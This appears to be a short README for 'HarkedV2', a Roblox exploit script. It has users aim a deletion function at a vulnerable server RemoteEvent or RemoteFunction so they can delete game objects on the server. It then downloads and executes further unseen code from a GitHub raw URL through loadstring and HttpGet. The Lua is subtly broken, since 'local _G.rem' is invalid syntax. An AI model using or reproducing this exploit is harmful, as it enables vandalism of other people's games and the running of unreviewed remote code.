# HarkedV2
Fixed version of 'Harked' by Harkinian. Made the ability to customize the deletion remote.

To run, edit the following script accordingly, and then execute:
```lua
local _G.rem = game.ReplicatedStorage.HouseChannel -- Change this to whatever remote is vulnerable for deletion

local function Delete(a: Instance)
    local args = { -- Change the arguments depending on how the remote works.
        [1] = a,
        [2] = true
    }
    
    if _G.rem:IsA("RemoteEvent") then
        _G.rem:FireServer(unpack(args))
    elseif _G.rem:IsA("RemoteFunction") then
        _G.rem:InvokeServer(unpack(args))
    elseif _G.rem:IsA("UnreliableRemoteEvent") then
        _G.rem:FireServer(unpack(args))
    end
end

_G.Delete = Delete

loadstring(game:HttpGet("https://raw.githubusercontent.com/qtip-rbxl/HarkedV2/main/main.lua", true))()
```
